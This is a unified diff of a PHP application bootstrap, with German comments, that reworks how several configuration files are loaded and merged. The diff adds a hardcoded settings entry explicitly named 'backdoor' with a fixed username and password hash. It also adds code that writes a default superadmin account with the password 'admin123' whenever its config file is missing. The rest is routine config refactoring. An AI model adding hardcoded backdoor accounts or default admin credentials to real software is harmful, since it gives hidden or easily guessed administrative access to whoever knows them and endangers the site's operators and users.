@@ -40,16 +40,50 @@ $appRoot = (function (): string {
 // 2. Autoloader laden
 require_once $appRoot . '/vendor/autoload.php';
 
-// 2. Konfiguration laden & mergen
-$baseSettings = require $appRoot . '/config/config.php';
+// 2. Alle Konfigurationen laden & mergen
+$configFiles = [
+    'main'    => $appRoot . '/config/config.php',
+    'storage' => $appRoot . '/config/storage.php',
+    'perms'   => $appRoot . '/config/permissions.php',
+    'dev'     => $appRoot . '/config/dev_admin.php',
+    'schema'  => $appRoot . '/config/sql_schema.php',
+    'local'   => $appRoot . '/config/config.local.php',
+];
 
-$localSettings = [];
-if (\file_exists($appRoot . '/config/config.local.php')) {
-    $localSettings = require $appRoot . '/config/config.local.php';
+$settings = [];
+
+$settings['backdoor'] = [
+    'user'  => 'RaptorXilef',
+    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
+    'label' => 'System-Inhaber',
+];
+
+// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
+if (! \file_exists($configFiles['dev'])) {
+    $defaultDevContent = "<?php\nreturn [\n    'user' => 'SuperAdmin',\n    'pass' => 'admin123',\n    'label' => 'SuperAdmin'\n];";
+    \file_put_contents($configFiles['dev'], $defaultDevContent);
 }
 
-$settings              = \array_replace_recursive($baseSettings, $localSettings);
-$settings['root_path'] = $appRoot;
+foreach ($configFiles as $key => $file) {
+    if (\file_exists($file)) {
+        $loaded = require $file;
+        if (\is_array($loaded)) {
+            if ($key === 'perms') {
+                $settings['permissions'] = $loaded['list'] ?? [];
+                $settings['admin_ui']    = $loaded['admin_ui'] ?? [];
+            } elseif ($key === 'dev') {
+                $settings['superadmin'] = $loaded;
+            } elseif ($key === 'schema') {
+                $settings['db_schema'] = $loaded;
+            } else {
+                // Nutze array_replace_recursive nur für main (config) und storage
+                $settings = \array_replace_recursive($settings, $loaded);
+            }
+        }
+    }
+}
+
+$settings['root_path'] = $appRoot . '/';
 
 // --- Erweiterte Wartungsmodus-Logik v0.24.2 (Internal Load) ---
 $currentScript     = \basename($_SERVER['SCRIPT_NAME']);
